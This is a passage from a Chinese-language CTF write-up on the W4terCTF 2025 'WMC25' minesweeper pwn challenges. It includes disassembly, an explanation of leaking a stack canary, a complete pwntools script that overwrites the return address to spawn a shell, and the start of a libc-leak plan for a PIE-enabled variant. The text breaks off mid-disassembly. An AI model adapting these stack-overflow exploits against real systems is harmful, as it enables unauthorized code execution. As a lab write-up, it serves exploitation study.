<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec --file=./pwn</span><br><span class="line">RELRO            tifiable</span><br><span class="line">STACK CANARY     Canary found</span><br><span class="line">NX               NX enabled</span><br><span class="line">PIE              No PIE</span><br><span class="line">RPATH            No RPATH</span><br></pre></td></tr></table></figure>
<p>ä¸ºäº†è¦†ç›–è¿”å›åœ°å€ä¸ºæ‰¾åˆ°çš„åé—¨å‡½æ•° <code>win</code> ï¼Œæˆ‘ä»¬ä¸€å®šä¼šè¦†ç›–æ‰ Canaryï¼Œä½†æ˜¯å¦‚æœ Canary è¢«ç ´åäº†çš„è¯ï¼Œè¿”å›æ—¶æ£€æŸ¥å°±ä¼šè·³åˆ° <code>__stack_chk_fail</code>ï¼Œç›´æ¥ stack smashingã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">40139e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax</span><br><span class="line">4013a2:	64 48 2b 04 25 28 00 	sub    %fs:0x28,%rax</span><br><span class="line">4013a9:	00 00 </span><br><span class="line">4013ab:	74 05                	je     4013b2 &lt;vuln+0xe2&gt;</span><br><span class="line">4013ad:	e8 8e fd ff ff       	call   401140 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
<p>å› æ­¤æˆ‘ä»¬éœ€è¦è®¾è®¡å¥½ä¸¤æ¬¡payloadï¼š</p>
<ol>
<li>ç¬¬ä¸€æ¬¡æäº¤24å­—èŠ‚çš„payloadï¼ˆ16 bytes buf + 8 bytes paddingï¼‰ï¼Œæ³„éœ² <strong>Canary</strong> å€¼ï¼šæ— è®ºæ˜¯é€šè¿‡ <code>pwntools</code> çš„ <code>sendline</code> å‘é€è¿˜æ˜¯æ‰‹åŠ¨ stdin è¾“å…¥ï¼Œæœ€åä¸€ä¸ªæ¢è¡Œç¬¦ <code>\n</code> éƒ½ä¼šè¢«è®°å½•ï¼è€Œæ°å¥½è¿™ä¸ªæ¢è¡Œç¬¦å¯ä»¥è¦†ç›–é‡‘ä¸é›€çš„æœ€ä½å­—èŠ‚ <code>\x00</code>ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è¯»å–è¾“å‡ºåçš„ä¸ƒä¸ªå­—èŠ‚ã€‚<img src="/2025/04/28/SYSU%20W4terCTF%202025/d1_canary.png" alt="d1_canary.png"></li>
<li>ç¬¬äºŒæ¬¡åœ¨ payload ä¸­å¡«ä¸Šæˆ‘ä»¬çš„ Canaryï¼Œåœ¨ <code>$rbp+8</code> å¼€å§‹çš„8å­—èŠ‚è¿”å›åœ°å€è¦†ç›–ä¸Š <code>win()</code> çš„å…¥å£åœ°å€ï¼Œå°è¯•å¾—åˆ° shellã€‚ä¸€å¼€å§‹æˆ‘è¦†ç›–çš„æ˜¯ <code>win</code> å‡½æ•°çš„å…¥å£åœ°å€ <code>0x4012b6</code> ï¼Œæ‰§è¡ŒæŒ‡ä»¤ <code>endbr64</code> ä¼šå‡ºé”™ï¼Œåªå¥½è·³åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤ <code>0x4012ba</code>ã€‚</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004012b</span>6 &lt;win&gt;:</span><br><span class="line">  <span class="number">4012b</span>6:	f3 <span class="number">0f</span> <span class="number">1</span>e fa          	endbr64 </span><br><span class="line">  <span class="number">4012b</span>a:	<span class="number">55</span>                   	push   %rbp</span><br><span class="line">  <span class="number">4012b</span>b:	<span class="number">48</span> <span class="number">89</span> e5             	mov    %rsp,%rbp</span><br><span class="line">  <span class="number">4012b</span>e:	<span class="number">48</span> <span class="number">8</span>d <span class="number">05</span> <span class="number">4b</span> <span class="number">0</span>d <span class="number">00</span> <span class="number">00</span> 	lea    <span class="number">0xd4b</span>(%rip),%rax        # <span class="number">402010</span> &lt;_IO_stdin_used+<span class="number">0x10</span>&gt;</span><br><span class="line">  <span class="number">4012</span>c5:	<span class="number">48</span> <span class="number">89</span> c7             	mov    %rax,%rdi</span><br><span class="line">  <span class="number">4012</span>c8:	e8 <span class="number">83</span> fe ff ff       	call   <span class="number">401150</span> &lt;system@plt&gt;</span><br><span class="line">  <span class="number">4012</span>cd:	<span class="number">90</span>                   	nop</span><br><span class="line">  <span class="number">4012</span>ce:	<span class="number">5</span>d                   	pop    %rbp</span><br><span class="line">  <span class="number">4012</span>cf:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<blockquote>
<p>é‚£ä¹ˆä¸ºä»€ä¹ˆæ— æ³•ç›´æ¥è·³åˆ° <code>endbr64</code>ï¼Ÿ</p>
</blockquote>
<p>è¿™æ˜¯å› ä¸º<code>endbr64</code> ä¸æ˜¯ä»»æ„å¯æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œ<strong>è¦æˆåŠŸæ‰§è¡Œ <code>endbr64</code>ï¼Œç³»ç»Ÿå¿…é¡»å¯ç”¨äº† CET/IBT ä¸”è¯¥æŒ‡ä»¤å‡ºç°åœ¨åˆæ³•çš„é—´æ¥è·³è½¬ç›®æ ‡å¤„</strong>ï¼Œå¦åˆ™ä¼šäº§ç”Ÿ <strong>#CP (Control Protection Exception)</strong>ã€‚IBT (Indirect Branch Tracking) æœºåˆ¶åªå…è®¸è¿™ä¸¤ç±»è·³è½¬åˆ° <code>endbr64</code>:</p>
<ul>
<li><code>jmp reg</code> ï¼šç›´æ¥ä»å¯„å­˜å™¨è·³è½¬ï¼Œæ¯”å¦‚ <code>jmp rax</code></li>
<li><code>call reg</code> ï¼šé—´æ¥è°ƒç”¨ï¼Œæ¯”å¦‚ <code>call rbx</code><br>
è¿™ä¸¤ç§è·³è½¬è¢« IBT æ ‡è®°ä¸ºâ€œåˆæ³•çš„<strong>é—´æ¥è·³è½¬å…¥å£æ£€æŸ¥</strong>â€ ï¼Œç”±äº <code>ret</code> æœ¬è´¨ä¸Šæ˜¯ <code>pop rip</code>ï¼Œæ‰€ä»¥ç›´æ¥è¢« CET IBT ç»™æ‹¦æˆªäº†ã€‚<br>
<img src="/2025/04/28/SYSU%20W4terCTF%202025/d1_flag.png" alt="d1_flag.png"></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exploit.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">PORT = &lt;port&gt;</span><br><span class="line">  </span><br><span class="line"><span class="comment"># win å‡½æ•°çš„åœ°å€</span></span><br><span class="line">WIN_ADDRESS = <span class="number">0x00000000004012be</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># vuln å‡½æ•°ä¸­ buf åˆ°è¿”å›åœ°å€çš„åç§»é‡</span></span><br><span class="line"><span class="comment"># 16 bytes buf + 8 bytes padding + 8 bytes canary + 8 bytes saved RBP = 40 bytes</span></span><br><span class="line">PAYLOAD_OFFSET = <span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Offset from the start of buf to the canary</span></span><br><span class="line"><span class="comment"># 16 bytes buf + 8 bytes padding = 24 bytes</span></span><br><span class="line">CANARY_OFFSET_FROM_BUF = <span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_minesweeper</span>(<span class="params">r</span>):</span><br><span class="line">Â  Â  log.info(<span class="string">&quot;å¼€å§‹è§£å†³æ‰«é›·æ¸¸æˆ...&quot;</span>)</span><br><span class="line">Â  Â  <span class="comment">#....</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># ç­‰å¾…èƒœåˆ©æç¤ºç¬¦ï¼Œè¿›å…¥ vuln å‡½æ•°</span></span><br><span class="line">Â  Â  r.recvuntil(<span class="string">b&quot;You win! Please sign your name: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_canary_and_exploit</span>(<span class="params">r</span>):</span><br><span class="line">Â  Â  log.info(<span class="string">&quot;è¿›å…¥æ¼æ´åˆ©ç”¨é˜¶æ®µ...&quot;</span>)</span><br><span class="line">Â  Â  <span class="comment"># sendline ä¼šè‡ªåŠ¨æ·»åŠ æ¢è¡Œç¬¦ï¼Œè¦†ç›–é‡‘ä¸é›€ç¬¬ä¸€ä¸ªå­—èŠ‚ (\x00)</span></span><br><span class="line">Â  Â  leak_padding_size = CANARY_OFFSET_FROM_BUF <span class="comment"># 24 bytes padding</span></span><br><span class="line">Â  Â  leak_payload = <span class="string">b&#x27;A&#x27;</span> * leak_padding_size</span><br><span class="line"></span><br><span class="line">Â  Â  log.info(<span class="string">f&quot;å‘é€æ³„éœ² payload (é•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(leak_payload)&#125;</span>)...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># å‘é€æ³„éœ² payload</span></span><br><span class="line">Â  Â  r.sendline(leak_payload)</span><br><span class="line">Â  Â  log.debug(<span class="string">&quot;æ³„éœ² payload å·²å‘é€ã€‚ç­‰å¾… Leaderboard...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># æ¥æ”¶åŒ…å«é‡‘ä¸é›€çš„è¾“å‡ºè¡Œ</span></span><br><span class="line">Â  Â  log.info(<span class="string">&quot;æ¥æ”¶è¾“å‡ºä»¥æ³„éœ²é‡‘ä¸é›€...&quot;</span>)</span><br><span class="line">Â  Â  <span class="keyword">try</span>:</span><br><span class="line">Â  Â  Â  Â  r.recvuntil(<span class="string">b&#x27;Leaderboard\n&#x27;</span>)</span><br><span class="line">Â  Â  Â  Â  log.debug(<span class="string">&quot;æ¥æ”¶åˆ° Leaderboard æ ‡è®°ã€‚å‡†å¤‡æ¥æ”¶æ³„éœ²è¡Œ...&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  <span class="comment"># å°è¯•æ¥æ”¶åŒ…å«å¡«å……çš„é‚£ä¸€è¡Œï¼Œç„¶åæ¥æ”¶ä¸‹ä¸€è¡Œï¼ˆåŒ…å«é‡‘ä¸é›€ï¼‰</span></span><br><span class="line">Â  Â  Â  Â  padding_line = r.recvline() <span class="comment"># æ¥æ”¶æ‰“å°å¡«å……å’Œæ¢è¡Œç¬¦çš„é‚£ä¸€è¡Œ</span></span><br><span class="line">Â  Â  Â  Â  log.debug(<span class="string">f&quot;æ¥æ”¶åˆ°å¡«å……è¡Œ: <span class="subst">&#123;padding_line&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  canary_line = r.recvline() <span class="comment"># æ¥æ”¶æ‰“å°é‡‘ä¸é›€å¼€å§‹çš„é‚£ä¸€è¡Œ</span></span><br><span class="line">Â  Â  Â  Â  log.info(<span class="string">f&quot;æ¥æ”¶åˆ°çš„é‡‘ä¸é›€è¡Œ: <span class="subst">&#123;canary_line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># ä»é‡‘ä¸é›€è¡Œä¸­è§£æé‡‘ä¸é›€çš„å 7 ä¸ªå­—èŠ‚</span></span><br><span class="line">Â  Â  Â  Â  canary_7_bytes = canary_line[:<span class="number">7</span>] <span class="comment"># æå–å‰ 7 ä¸ªå­—èŠ‚</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># é‡æ„å®Œæ•´çš„ 8 å­—èŠ‚é‡‘ä¸é›€ï¼š \x00 + å 7 ä¸ªå­—èŠ‚</span></span><br><span class="line">Â  Â  Â  Â  canary_value_bytes = <span class="string">b&#x27;\x00&#x27;</span> + canary_7_bytes</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  log.success(<span class="string">f&quot;æˆåŠŸæå–é‡‘ä¸é›€ï¼ˆé‡æ„å‰ 7 å­—èŠ‚ï¼‰: <span class="subst">&#123;canary_7_bytes&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  log.success(<span class="string">f&quot;é‡æ„å®Œæ•´çš„é‡‘ä¸é›€: <span class="subst">&#123;canary_value_bytes&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> <span class="built_in">len</span>(canary_value_bytes) != <span class="number">8</span>:</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â log.warning(<span class="string">f&quot;é‡æ„åçš„é‡‘ä¸é›€é•¿åº¦ä¸æ˜¯ 8 (<span class="subst">&#123;<span class="built_in">len</span>(canary_value_bytes)&#125;</span>)ï¼Œå¯èƒ½æå–é”™è¯¯æˆ–é‡‘ä¸é›€ç»“æ„ä¸åŒã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â log.info(<span class="string">f&quot;é‡‘ä¸é›€è¡Œæ‰€æœ‰å­—èŠ‚ (hex): <span class="subst">&#123;canary_line.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">except</span> EOFError:</span><br><span class="line">Â  Â  Â  Â  Â log.error(<span class="string">&quot;è¿æ¥åœ¨æ³„éœ²é˜¶æ®µå…³é—­ï¼Œè¯·è°ƒè¯•ã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â log.error(<span class="string">&quot;å¯èƒ½æ³„éœ² payload å¯¼è‡´ç¨‹åºç«‹å³å´©æºƒã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â <span class="keyword">return</span></span><br><span class="line">Â  Â  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">Â  Â  Â  Â  Â log.error(<span class="string">f&quot;è§£æè¾“å‡ºæ—¶å‘ç”Ÿé”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># --- æ„é€ å¹¶å‘é€ç¬¬äºŒæ¬¡ exploit payload ---</span></span><br><span class="line">Â  Â  log.info(<span class="string">&quot;ç­‰å¾…ä¸‹ä¸€è½®è¾“å…¥æç¤ºç¬¦...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">try</span>:</span><br><span class="line">Â  Â  Â  Â  r.recvuntil(<span class="string">b&quot;Just give us another shorter nickname: &quot;</span>)</span><br><span class="line">Â  Â  Â  Â  log.info(<span class="string">&quot;æ¥æ”¶åˆ°æç¤ºç¬¦ã€‚å‡†å¤‡å‘é€ exploit payload...&quot;</span>)</span><br><span class="line">Â  Â  <span class="keyword">except</span> EOFError:</span><br><span class="line">Â  Â  Â  Â  log.error(<span class="string">&quot;è¿æ¥åœ¨æ¥æ”¶ä¸‹ä¸€è½®è¾“å…¥æç¤ºç¬¦æ—¶å…³é—­ï¼Œè¯·è°ƒè¯•ã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  log.error(<span class="string">&quot;å¯èƒ½ç¨‹åºåœ¨ç­‰å¾…è¾“å…¥å‰å´©æºƒã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># å¡«å…… (åˆ°è¾¾é‡‘ä¸é›€ä½ç½®å‰): buf 16 bytes + padding 8 bytes = 24 bytes</span></span><br><span class="line">Â  Â  padding_before_canary = <span class="string">b&#x27;A&#x27;</span> * <span class="number">15</span> + <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;C&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">Â  Â  padding_after_canary = <span class="string">b&#x27;B&#x27;</span> * (PAYLOAD_OFFSET - CANARY_OFFSET_FROM_BUF - <span class="number">8</span>)</span><br><span class="line">Â  Â  <span class="comment"># win å‡½æ•°åœ°å€ (8 å­—èŠ‚å°ç«¯åº)</span></span><br><span class="line">Â  Â  win_address_bytes = p64(WIN_ADDRESS)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># æœ€ç»ˆ payload = å¡«å…… + é‡‘ä¸é›€ + RBP å¡«å…… + è¿”å›åœ°å€</span></span><br><span class="line">Â  Â  exploit_payload = padding_before_canary + canary_value_bytes + padding_after_canary + win_address_bytes</span><br><span class="line">  </span><br><span class="line">Â  Â  log.info(<span class="string">f&quot;å‘é€ exploit payload (é•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(exploit_payload)&#125;</span>)...&quot;</span>)</span><br><span class="line">Â  Â  r.sendline(exploit_payload) <span class="comment"># ä½¿ç”¨ sendline å‘é€æœ€ç»ˆ payload</span></span><br><span class="line">Â  Â  log.debug(<span class="string">&quot;Exploit payload å·²å‘é€ã€‚&quot;</span>)</span><br><span class="line">Â  Â  log.info(<span class="string">&quot;Payload å·²å‘é€ã€‚å°è¯•ä¸ shell äº¤äº’...&quot;</span>)</span><br><span class="line">Â  Â  log.debug(<span class="string">&quot;Exploit payload å·²å‘é€ã€‚&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  r.recvuntil(<span class="string">b&quot;Thanks for playing my game.\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸»ç¨‹åºå…¥å£</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">Â  Â  context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">Â  Â  context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">  </span><br><span class="line">Â  Â  <span class="keyword">try</span>:</span><br><span class="line">Â  Â  Â  Â  conn = remote(HOST, PORT)</span><br><span class="line">Â  Â  Â  Â  log.info(<span class="string">f&quot;æˆåŠŸè¿æ¥åˆ° <span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">Â  Â  Â  Â  log.error(<span class="string">f&quot;è¿æ¥åˆ° <span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span> å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  exit()</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># è§£å†³æ‰«é›·æ¸¸æˆ</span></span><br><span class="line">Â  Â  solve_minesweeper(conn)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># è·å–é‡‘ä¸é›€å¹¶å‘é€ exploit payload</span></span><br><span class="line">Â  Â  get_canary_and_exploit(conn)</span><br><span class="line"></span><br><span class="line">Â  Â  conn.close()</span><br></pre></td></tr></table></figure>
<h1 id="wmc25-d2"><a class="markdownIt-Anchor" href="#wmc25-d2"></a> WMC25 D2</h1>
<p>éš¾åº¦å†æ¬¡å‡çº§ï¼è¿™æ¬¡ç›´æ¥æŠŠåé—¨å‡½æ•° <code>win</code>ç»™å»æ‰äº†ï¼Œæˆ‘ä»¬éœ€è¦å¦‚ä½•æ‰§è¡Œä¹‹å‰çš„ <code>system(&quot;/bin/sh&quot;)</code> ï¼Ÿè¿™ä¸ªè¯­å¥æ ¹æœ¬ä¸åœ¨ç¼–è¯‘åçš„å¯é“¾æ¥ç¨‹åºé‡Œï¼</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123; <span class="built_in">printf</span>(<span class="string">&quot;You are the W4ter Minesweeper Champion (WMC) !\n&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>] = &#123;&#125;;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You win! Please sign your name: &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x408</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nLeaderboard\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;01 %16s ... %ds\n\n&quot;</span>, buf, last);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(buf) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Your name is too long, which will break our award ceremony!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Just give us another shorter nickname: &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Thanks for playing my game.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶è€Œä¸ä»…äºæ­¤ï¼ç¨‹åºè¿˜ä½¿ç”¨äº†åœ°å€ç©ºé—´éšæœºåŒ– ASLRï¼Œç¼–è¯‘å¼€å¯ PIEï¼Œä¹Ÿå°±æ˜¯è¯´æ¯ä¸€æ¬¡ executable åŠ è½½çš„åŸºåœ°å€æ˜¯ä¸ç¡®å®šçš„ï¼ˆä½†ä¸€èˆ¬é«˜å­—èŠ‚ä¸º<code>0x55</code>ï¼‰ï¼Œè€Œä¸”åŠ¨æ€åº“ <code>libc</code> åŠ è½½çš„åŸºåœ°å€ä¹Ÿæ˜¯ä¸ç¡®å®šçš„ï¼ˆä¸€èˆ¬ä¸ºé«˜å­—èŠ‚ä¸º <code>0x7f</code>ï¼Œä½†æ˜¯è¦åŒºåˆ«äºç”¨æˆ·ç¨‹åºæ ˆï¼‰ï¼</p>
<h2 id="-code9-"><a class="markdownIt-Anchor" href="#-code9-"></a> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec --file=./pwn</span><br><span class="line">RELRO            FULL RELRO</span><br><span class="line">STACK CANARY     Canary found</span><br><span class="line">NX               NX enabled</span><br><span class="line">PIE              PIE enabled</span><br><span class="line">RPATH            No RPATH</span><br></pre></td></tr></table></figure></h2>
<p><code>system</code> å‡½æ•°ä»¥åŠ <code>/bin/sh</code> å­—ç¬¦ä¸²å…¶å®éƒ½ä½äºåŠ¨æ€åº“ <code>libc.so.6</code> é‡Œï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦è¯»å– libc é‡Œé¢çš„ <code>.rodata</code> å¹¶æ‰§è¡Œ <code>.text</code> é‡Œçš„å‡½æ•°å‘¢ï¼Œé‚£ä¹ˆå°±å¾—çŸ¥é“ libc è¢«åŠ è½½çš„åŸºåœ°å€ï¼</p>
<h3 id="putsplt-æ‰“å°-libc-å‡½æ•°åœ°å€"><a class="markdownIt-Anchor" href="#putsplt-æ‰“å°-libc-å‡½æ•°åœ°å€"></a> &lt;puts@plt&gt; æ‰“å° libc å‡½æ•°åœ°å€</h3>
<p>ç¬¬ä¸€æ¬¡çš„æƒ³æ³•æ˜¯é€šè¿‡ç¨‹åºé‡Œçš„ <code>&lt;puts@plt&gt;</code>  è·³è½¬åˆ°åœ¨ <code>libc</code> åœ°å€ç©ºé—´ä¸­å®é™…æ‰§è¡Œ <code>puts</code> å‡½æ•°çš„ <code>puts@got</code> ï¼Œé€šè¿‡<code>puts@plt(read@got)</code> æ‰“å° <code>read</code> çš„å®é™…åœ°å€ã€‚å¾—åˆ°å®é™…åœ°å€åå‡å»<code>read</code>åœ¨ libc ä¸­å›ºå®šçš„åç§»é‡å°±èƒ½å¾—åˆ° libc è¿è¡Œæ—¶çš„åŸºå€äº†ï¼å‡½æ•°åœ¨ PLT è¡¨ä¸­çš„åç§»é‡æˆ‘ä»¬å¯ä»¥åæ±‡ç¼– executable å¾—åˆ°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .plt.sec:</span><br><span class="line"></span><br><span class="line">0000000000001120 &lt;puts@plt&gt;:</span><br><span class="line">    1120:	f3 0f 1e fa          	endbr64 </span><br><span class="line">    1124:	f2 ff 25 5d 2e 00 00 	bnd jmp *0x2e5d(%rip)        # 3f88 &lt;puts@GLIBC_2.2.5&gt;</span><br><span class="line">    112b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)</span><br><span class="line"></span><br><span class="line">0000000000001140 &lt;__stack_chk_fail@plt&gt;:</span><br><span class="line">    1140:	f3 0f 1e fa          	endbr64 </span><br><span class="line">    1144:	f2 ff 25 4d 2e 00 00 	bnd jmp *0x2e4d(%rip)        # 3f98 &lt;__stack_chk_fail@GLIBC_2.4&gt;</span><br><span class="line">    114b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)</span><br><span class="line"></span><br><span class="line">0000000000001170 &lt;read@plt&gt;:</span><br><span class="line">    1170:	f3 0f 1e fa          	endbr64 </span><br><span class="line">    1174:	f2 ff 25 35 2e 00 00 	bnd jmp *0x2e35(%rip)        # 3fb0 &lt;read@GLIBC_2.2.5&gt;</span><br><span class="line">    117b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)</span><br></pre></td></tr></table></figure>
